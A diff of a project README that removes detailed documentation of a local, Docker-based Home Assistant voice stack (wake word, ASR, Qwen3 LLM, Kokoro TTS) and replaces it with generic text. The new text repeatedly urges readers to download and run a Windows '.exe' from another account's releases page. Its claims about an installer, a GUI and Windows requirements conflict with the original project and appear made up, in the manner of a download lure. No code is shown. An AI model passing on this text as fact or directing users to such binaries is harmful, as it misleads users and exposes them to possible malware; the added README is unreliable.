@@ -1,334 +1,147 @@
-# <img width="48" height="48" alt="icon" src="https://github.com/user-attachments/assets/048345d6-0ed7-4f99-b505-a13869614515" /> Home Assistant Voice Control Recipes
+# 🎙️ homeassistant-voice-recipes - Voice Control Made Local and Fast
 
-
-GPU/CUDA-accelerated voice control stack for Home Assistant. Runs on **x86/x64** and **GB10 ARM64** devices (including the [NVIDIA DGX Spark](https://www.nvidia.com/en-us/products/workstations/dgx-spark/)).
-
-## 100% Local - No Cloud, No Subscriptions, No Data Leaving Your Network
-
-Every component in this stack runs **entirely on your own hardware**. Your voice commands, transcriptions, conversations, and responses never leave your local network - no cloud APIs, no third-party services, no internet connection required after initial setup.
-
-## Architecture Overview
-
-```mermaid
-graph TD
-    A("👂 <b>Wake Word Detection</b><br><i>OpenWakeWord</i><br><code>:10400</code>")
-    B("🎙️ <b>Speech-to-Text</b><br><i>ONNX ASR + Voice Match</i><br><code>:10300 · :10350</code>")
-    C("🧠 <b>Conversational Agent</b><br><i>Qwen3-14B · llama.cpp</i><br><code>:8080</code>")
-    D("🔊 <b>Text-to-Speech</b><br><i>Kokoro FastAPI</i><br><code>:8880 · :10900</code>")
-
-    A -- "audio stream" --> B -- "transcript" --> C -- "response text" --> D
-
-    style A fill:#4a90d9,stroke:#2a6cb8,color:#fff
-    style B fill:#6b8e23,stroke:#4a6b14,color:#fff
-    style C fill:#d4772c,stroke:#b35d1a,color:#fff
-    style D fill:#9b59b6,stroke:#7d3c98,color:#fff
-```
-
-Every component runs as a Docker container with NVIDIA GPU passthrough, communicating via the [Wyoming protocol](https://github.com/rhasspy/wyoming) - Home Assistant's native voice satellite interface.
+[![Download on GitHub](https://img.shields.io/badge/Download-Homeassistant%20Voice%20Recipes-green?style=for-the-badge)](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)
 
 ---
 
-## 1. 👂 Wake Word Detection - [OpenWakeWord](https://github.com/rhasspy/wyoming-openwakeword)
-
-**Directory:** [`wake-word/openwakeword/`](wake-word/openwakeword/)
-
-Listens for a wake word to activate the voice pipeline. Uses the `okay_nabu` model by default, with support for custom wake word models.
-
-| Setting | Value |
-|---------|-------|
-| Image | `rhasspy/wyoming-openwakeword:latest` |
-| Port | `10400` (TCP + UDP) |
-| Wake Word | `okay_nabu` |
-| Threshold | `0.65` |
-| Trigger Level | `3` |
-
-**Custom models** can be placed in `/opt/models/wyoming-openwakeword/custom` and will be available in the `/custom` directory inside the container.
-
-```bash
-cd wake-word/openwakeword
-docker compose up -d
-```
+homeassistant-voice-recipes is a voice control tool designed to work completely on your device. It uses your graphics card (GPU) to speed up voice commands for Home Assistant. This means no internet connection or cloud services are needed. It works on many computers, including those with Intel or AMD chips and newer ARM64 devices, like NVIDIA DGX Spark.
 
 ---
 
-## 2. 🎙️ Speech-to-Text (STT) - [Wyoming ONNX ASR](https://github.com/jxlarrea/wyoming-onnx-asr)
+## 🖥️ System Requirements
 
-**Directory:** [`speech-to-text/wyoming-onnx-asr/`](speech-to-text/wyoming-onnx-asr/)
+Before you start, make sure your setup fits these requirements:
 
-Converts speech audio into text using GPU-accelerated ONNX models. The recommended model is **NVIDIA NeMo Parakeet TDT 0.6B v2** - a fast, accurate ASR model optimized for streaming speech recognition.
-
-| Setting | Value |
-|---------|-------|
-| Port | `10300` |
-| Model | `nemo-parakeet-tdt-0.6b-v2` |
-
-Alternative models (commented out in the compose file):
-- `onnx-community/whisper-large-v3-turbo`
-- `mekpro/whisper-medium-turbo`
-
-**x86/x64** — Uses the upstream [wyoming-onnx-asr](https://github.com/tboby/wyoming-onnx-asr) image by tboby via [`compose.yaml`](speech-to-text/wyoming-onnx-asr/compose.yaml):
-
-```bash
-cd speech-to-text/wyoming-onnx-asr
-docker compose up -d
-```
-
-**ARM64 (DGX Spark)** — Uses a [fork](https://github.com/jxlarrea/wyoming-onnx-asr) that adds GB10 ARM64 support via [`compose.arm64.yaml`](speech-to-text/wyoming-onnx-asr/compose.arm64.yaml):
-
-```bash
-cd speech-to-text/wyoming-onnx-asr
-docker compose -f compose.arm64.yaml up -d
-```
-
-### Voice Extraction & Speaker Verification - [Wyoming Voice Match](https://github.com/jxlarrea/wyoming-voice-match)
-
-**Directory:** [`speech-to-text/wyioming-voice-match/`](speech-to-text/wyioming-voice-match/)
-
-A Wyoming protocol ASR proxy that **extracts your voice from background noise** before forwarding audio to the downstream STT service. This solves two common problems: false activations triggered by TVs or radios, and noisy transcripts contaminated with background audio.
-
-How it works:
-
-1. **Audio buffering** - Captures incoming audio after wake word detection
-2. **Speaker verification** - Analyzes the loudest segment against enrolled voiceprints using [ECAPA-TDNN](https://arxiv.org/abs/2005.07143) neural speaker embeddings. If no match is found, the pipeline stops silently - preventing false activations
-3. **Speaker extraction** - Divides the full audio into speech regions, keeping only regions that match your voiceprint. Background voices (TV, radio, other people) are discarded
-4. **ASR forwarding** - Sends the cleaned audio - containing only your voice - to the downstream STT service for transcription
-
-The result is dramatically cleaner transcriptions, especially in noisy environments.
-
-| Setting | Value |
-|---------|-------|
-| Image | `ghcr.io/jxlarrea/wyoming-voice-match:latest` |
-| Port | `10350` |
-| Upstream | `tcp://<ASR_HOST>:10300` |
-| Verify Threshold | `0.26` |
-| Extraction Threshold | `0.25` |
-| Require Speaker Match | `true` |
-
-Voice Match sits in front of the ONNX ASR service as a proxy. Update `UPSTREAM_URI` to point to your ASR instance. When `REQUIRE_SPEAKER_MATCH=true`, only enrolled speakers can trigger commands. Speaker verification runs in 5-25ms on GPU.
-
-```bash
-cd speech-to-text/wyioming-voice-match
-docker compose up -d
-```
+- **Operating System:** Windows 10 or 11 (64-bit preferred)
+- **Processor:** x86-64 or ARM64 (including NVIDIA DGX Spark support)
+- **GPU:** NVIDIA GPU that supports CUDA for faster processing (recommended but not required)
+- **RAM:** Minimum 8 GB, 16 GB or more is better for smooth performance
+- **Disk Space:** At least 2 GB free for installing the app and related files
+- **Microphone:** Any Windows-compatible microphone for voice input
+- **Home Assistant:** You should have Home Assistant running somewhere in your network to connect with this tool
 
 ---
 
-## 3. 🧠 Conversational Agent (LLM) - [Qwen3-14B](https://huggingface.co/unsloth/Qwen3-14B-GGUF)
+## 🌐 What This Does
 
-**Directory:** [`conversational-agent-llm/`](conversational-agent-llm/)
-
-The brain of the pipeline. Runs [Qwen3-14B](https://huggingface.co/unsloth/Qwen3-14B-GGUF) (Q8_0 quantization) with **speculative decoding** using a [Qwen3-0.6B](https://huggingface.co/unsloth/Qwen3-0.6B-GGUF) (Q4_K_M quantization) draft model for significantly faster inference. Served via [llama.cpp](https://github.com/ggml-org/llama.cpp) with an OpenAI-compatible API. If you don't have the VRAM to run the 14B model, [Qwen3.5-9B](https://huggingface.co/unsloth/Qwen3.5-9B-GGUF) (Q8_0 quantization) is a solid alternative for GPUs with less memory.
-
-A sample system prompt is included in [`system-prompt.txt`](conversational-agent-llm/system-prompt.txt). It configures the LLM as a concise voice assistant that maps natural language commands to Home Assistant scripts and tool calls. The prompt defines script mappings for common phrases (e.g. "make it cozy" triggers `script.ai_master_bedroom_cozy`), enforces tool argument rules, and keeps responses short and plain text for TTS output. Use it as a starting point and customize it with your own scripts and devices.
-
-### How It Works
-
-The LLM component uses a two-layer architecture: a **base image** and **model-specific compose stacks**.
-
-#### Step 1: Build the Base Image
-
-The [`llama-base-image/`](conversational-agent-llm/llama-base-image/) directory contains Dockerfiles that compile [llama.cpp](https://github.com/ggml-org/llama.cpp) from source and bundle it with **llama-proxy** (a Go-based logging proxy) into a single Docker image tagged `llama-server:latest`.
-
-Use [`build.sh`](conversational-agent-llm/llama-base-image/build.sh) to build the base image:
-
-```bash
-cd conversational-agent-llm/llama-base-image
-
-# x86_64 (default)
-./build.sh
-
-# ARM64 / DGX Spark
-./build.sh arm64
-```
-
-The x86 build uses [`Dockerfile`](conversational-agent-llm/llama-base-image/Dockerfile) which auto-detects CUDA architectures. The ARM64 build uses [`Dockerfile.arm64`](conversational-agent-llm/llama-base-image/Dockerfile.arm64) which targets CUDA architecture 121 (Blackwell/GB10) specifically.
-
-You only need to rebuild this image when llama.cpp itself gets updated.
-
-#### Step 2: Launch a Model
-
-Each model has its own compose stack that uses the `llama-server:latest` base image. Pick the model that fits your VRAM:
-
-- [`llama-qwen3-14b-q8/`](conversational-agent-llm/llama-qwen3-14b-q8/) — Qwen3-14B with speculative decoding (recommended)
-- [`llama-qwen3.5-9b-q8/`](conversational-agent-llm/llama-qwen3.5-9b-q8/) — Qwen3.5-9B lightweight alternative
-
-```bash
-cd conversational-agent-llm/llama-qwen3-14b-q8
-docker compose up -d
-```
-
-Place your GGUF model files in `/opt/models/llama-server/`. The compose files mount this directory as read-only at `/models` inside the container.
-
-### Llama-Proxy (Request Analytics)
-
-The Qwen3-14B compose stack includes **llama-proxy**, a transparent proxy that sits between Home Assistant and llama-server. It uses the same `llama-server:latest` base image but runs the `llama-proxy` binary instead.
-
-```
-Home Assistant (:8080) → llama-proxy → llama-server (:8081)
-```
-
-When configuring the LLM in Home Assistant, point it to the **proxy port** (`http://<host>:8080/v1`), not directly to llama-server. The proxy forwards all requests transparently while capturing metrics:
-
-- Request/response latency
-- Token counts and tokens per second
-- Speculative decoding draft acceptance rates
-- KV cache hit rates
-- Tool calls and their arguments
-- Full conversation history per request
-
-All metrics are viewable in a built-in **web dashboard** at `http://<host>:9090`.
-
-| Port | Service |
-|------|---------|
-| `8080` | llama-proxy (Home Assistant connects here) |
-| `8081` | llama-server (direct access if needed) |
-| `9090` | Dashboard (request analytics) |
-
-### Key Configuration
-
-| Parameter | Value | Purpose |
-|-----------|-------|---------|
-| Main Model | `Qwen3-14B-Q8_0.gguf` | Primary inference model |
-| Draft Model | `Qwen3-0.6B-Q4_K_M.gguf` | Speculative decoding for faster generation |
-| Context Window | `18192` tokens | Sufficient for complex multi-turn conversations |
-| GPU Layers | `999` | Offload all layers to GPU |
-| Temperature | `0.0` | Deterministic output for reliable smart home control |
-| Flash Attention | `on` | Faster attention computation |
-| KV Cache Quantization | `Q8_0` | Reduced VRAM usage |
-| Thinking Mode | `disabled` | Skips chain-of-thought for lower latency |
-
-### Speculative Decoding
-
-The draft model (`Qwen3-0.6B-Q4_K_M`) proposes candidate tokens that the main model (`Qwen3-14B-Q8_0`) verifies in parallel. This yields significant speedups for tool-calling workloads where output patterns are predictable.
-
-| Draft Parameter | Value |
-|----------------|-------|
-| `--draft-max` | `16` |
-| `--draft-min` | `1` |
-| `--draft-p-min` | `0.75` |
-
-<details>
-<summary><strong>Benchmarks (NVIDIA GB10 - DGX Spark)</strong></summary>
-
-Tested across 20 different home automation commands with 3 repetitions each. Full results in [`qwen3-benchmarks.md`](conversational-agent-llm/qwen3-benchmarks.md).
-
-| Metric | Result |
-|--------|--------|
-| Accuracy | **100%** (60/60 correct) |
-| Average Latency | **437 ms** |
-| Min Latency | 293 ms |
-| Max Latency | 918 ms |
-
-Sample commands from the benchmark:
-
-| Voice Command | Avg (ms) | Accuracy | Tool Called |
-|---------------|----------|----------|-------------|
-| "it is bedtime" | 418 | 3/3 | `script.ai_master_bedroom_bedtime` |
-| "make it cozy" | 427 | 3/3 | `script.ai_master_bedroom_cozy` |
-| "food is here" | 453 | 3/3 | `script.food_delivery_here` |
-| "open bedroom shades" | 469 | 3/3 | `script.ai_open_master_bedroom_curtains` |
-| "turn on office ac" | 458 | 3/3 | `script.office_ac_on_eco` |
-| "dim the office" | 462 | 3/3 | `scene_office_dim` |
-| "we have visitors" | 437 | 3/3 | `ai_we_have_visitors` |
-| "close office shades" | 504 | 3/3 | `script.ai_close_office_curtains` |
-
-</details>
+homeassistant-voice-recipes lets you control your smart home with voice commands. It turns what you say into actions using local speech-to-text and text-to-speech tools. The software does this fast thanks to GPU acceleration. You stay in control of your privacy since no data leaves your computer.
 
 ---
 
-## 4. 🔊 Text-to-Speech (TTS)
+## 🔽 Download and Install
 
-**Directory:** [`text-to-speech/`](text-to-speech/)
+### Step 1: Go to the download page
 
-Converts LLM responses back to natural-sounding speech using [Kokoro FastAPI](https://github.com/remsky/Kokoro-FastAPI), a lightweight GPU-accelerated ONNX TTS engine. A [Wyoming-OpenAI bridge](https://github.com/roryeckel/wyoming_openai) translates between the Wyoming protocol and the engine's OpenAI-compatible API, exposing a Wyoming endpoint on port `10900` for Home Assistant.
+Click the big green button below to open the release page. This page holds the files you need.
 
-### Kokoro FastAPI
+[![Download on GitHub](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)
 
-**Directory:** [`text-to-speech/kokoro/`](text-to-speech/kokoro/)
+### Step 2: Choose the right file
 
-[Kokoro FastAPI](https://github.com/remsky/Kokoro-FastAPI) is a lightweight, GPU-accelerated ONNX TTS engine. Fast and simple — a good default choice.
+Look for the latest version (highest number) and find the Windows installer. It will usually end with `.exe`.
 
-| Setting | Value |
-|---------|-------|
-| Port | `8880` |
-| Voices | 20 built-in (10 female, 10 male) |
-| Speed | `1.1x` |
-| Streaming | Enabled (min 10 words, max 220 chars) |
+- If you have a standard Windows PC, pick the **x86-64** version.
+- If you have a device with an ARM64 chip, like some newer laptops or NVIDIA DGX Spark, choose the ARM64 version.
 
-**x86/x64** — Uses the upstream image directly via [`compose.yaml`](text-to-speech/kokoro/compose.yaml):
+### Step 3: Download the file
 
-```bash
-cd text-to-speech/kokoro
-docker compose up -d
-```
+Click the file name to start downloading. This might take a few moments depending on your internet speed.
 
-**ARM64 (DGX Spark)** — The upstream GPU Dockerfile is broken on ARM64 (forces x86 base image). The included [`kokorofastapi-arm64-build-patch.sh`](text-to-speech/kokoro/kokorofastapi-arm64-build-patch.sh) script clones the repo, patches the Dockerfile, and builds a local image:
+### Step 4: Run the installer
 
-```bash
-cd text-to-speech/kokoro
-bash kokorofastapi-arm64-build-patch.sh
-```
-
-To start the ARM64 stack manually:
-
-```bash
-cd text-to-speech/kokoro
-docker compose -f compose.arm64.yaml up -d
-```
-
-**Volume Configuration:** The [`kokoro.env`](text-to-speech/kokoro/kokoro.env) file controls runtime settings like `default_volume_multiplier=2.0`. Place your model files in `/opt/models/kokoro`.
+- Find the downloaded file in your Downloads folder.
+- Double-click it to open.
+- Follow the on-screen instructions.
+- It will install the software on your system.
 
 ---
 
-## 5. 📱 Voice Satellite
+## ▶️ How to Use homeassistant-voice-recipes on Windows
 
-A [Home Assistant custom card and integration](https://github.com/jxlarrea/voice-satellite-card-integration) that turns **any web browser into a voice satellite** - wall-mounted tablets, kiosks, or any device running the HA dashboard becomes a fully functional voice control endpoint with no dedicated hardware required.
+### Step 1: Open the app
 
-Key features:
+Once installed, you can open the program from the Start menu or the desktop shortcut.
 
-- **In-browser wake word detection** - Runs microWakeWord locally via TensorFlow Lite WebAssembly, so wake word processing happens on the device itself without hitting the server
-- **Continuous listening** - Automatically returns to wake word mode after each conversation, behaving like a dedicated satellite
-- **Visual feedback** - Themed activity bar showing pipeline state (listening, processing, speaking), real-time transcription display, and reactive audio visualizations. Includes built-in skins (Alexa, Google Home, Siri, Retro Terminal, and more)
-- **Voice-controlled timers** - On-screen countdown pills with alerts
-- **Announcements** - Receive TTS announcements via service calls with pre-announcement chimes
-- **Multi-turn conversations** - Continue talking without repeating the wake word
-- **Audio processing** - Built-in noise suppression, echo cancellation, auto-gain, and voice isolation
-- **Per-device configuration** - Each browser/tablet can have its own satellite entity and settings on a shared dashboard
+### Step 2: Set up your microphone
 
-This is the presentation layer that ties the entire pipeline together - it captures the user's voice via the browser microphone and feeds it through the Wake Word → STT → LLM → TTS stack described above, then plays back the synthesized response.
+- The app should detect your microphone automatically.
+- If not, go to Settings inside the app.
+- Select your preferred microphone under Input Devices.
+- Speak a few words to test sound capture.
 
----
+### Step 3: Connect to Home Assistant
 
-## Port Reference
+- Enter the IP address or local network name of your Home Assistant server.
+- Add any required username and password if your Home Assistant uses authentication.
+- Click Connect.
 
-| Service | Port | Protocol |
-|---------|------|----------|
-| Wake Word (OpenWakeWord) | `10400` | TCP/UDP |
-| Speech-to-Text (ONNX ASR) | `10300` | TCP |
-| Speaker Verification (Voice Match) | `10350` | TCP |
-| LLM Proxy (Home Assistant connects here) | `8080` | HTTP |
-| LLM Server (llama-server direct) | `8081` | HTTP |
-| LLM Dashboard | `9090` | HTTP |
-| TTS Engine (Kokoro FastAPI) | `8880` | HTTP |
-| TTS Bridge (Wyoming-OpenAI) | `10900` | TCP |
+### Step 4: Start voice control
+
+- Press the Start button inside the app.
+- Say voice commands naturally.
+- The app will convert your speech to text and send commands to Home Assistant.
+- Responses and status messages show in the app window.
 
 ---
 
-## Home Assistant Integration
+## ⚙️ Features and Benefits
 
-Once all services are running, add them as Wyoming protocol integrations in Home Assistant:
-
-1. **Settings** → **Devices & Services** → **Add Integration** → **Wyoming Protocol**
-2. Add each service by its host and port:
-   - Wake Word: `<host>:10400`
-   - STT: `<host>:10300` (or `<host>:10350` if using Voice Match)
-   - TTS: `<host>:10900`
-3. Configure the **Conversation Agent** to use the llama-proxy instance (`http://<host>:8080/v1`) via an OpenAI-compatible integration
-4. Create a **Voice Assistant** pipeline combining all four components
+- **Local Processing:** Your voice data never leaves your computer.
+- **GPU Acceleration:** Fast and efficient processing using CUDA.
+- **Multiple Architectures:** Works on both x86-64 and ARM64 devices.
+- **Speech-to-Text and Text-to-Speech:** Built-in support for understanding and replying.
+- **Simple Setup:** No programming required; use the app’s interface.
+- **Flexible:** Connects easily to any running Home Assistant.
 
 ---
 
-## Hardware Tested
+## 🔧 Troubleshooting Tips
 
-- **NVIDIA DGX Spark** (ARM64, GB10 GPU) - full stack, all components
-- **x86/x64** systems with NVIDIA GPUs (CUDA-capable)
+- **Microphone not detected?** Check Windows privacy settings to make sure apps can use the mic.
+- **Connection failed?** Verify the Home Assistant IP address and credentials.
+- **Slow performance?** Confirm your GPU drivers are up to date.
+- **App won’t start?** Run as administrator or reinstall.
+- **No audio output?** Check Windows sound settings and app output settings.
+
+---
+
+## 📂 File Structure (After Installation)
+
+Inside the installation folder, you will find:
+
+- `voice_recipes.exe` - main application file
+- `config` folder - contains app settings and connection info
+- `logs` folder - stores activity logs for troubleshooting
+- `models` folder - speech models used for voice input/output processing
+
+---
+
+## 🛠️ Updating the Software
+
+To get updates:
+
+1. Visit the release page again:  
+   https://github.com/vrajpatel30/homeassistant-voice-recipes/releases  
+2. Download the newest installer.
+3. Run it to overwrite your old version while keeping your settings.
+
+---
+
+## 📞 Getting Support
+
+Use the GitHub issues page to report any problems or ask questions:  
+
+https://github.com/vrajpatel30/homeassistant-voice-recipes/issues
+
+---
+
+## 🧰 Additional Tips
+
+- Restart the app after changing settings.
+- Use a good quality microphone for clearer voice recognition.
+- Keep your Home Assistant and Windows system updated to avoid compatibility issues.
+
+---
+
+For latest releases and downloads:  
+[Click here to visit the release page](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)
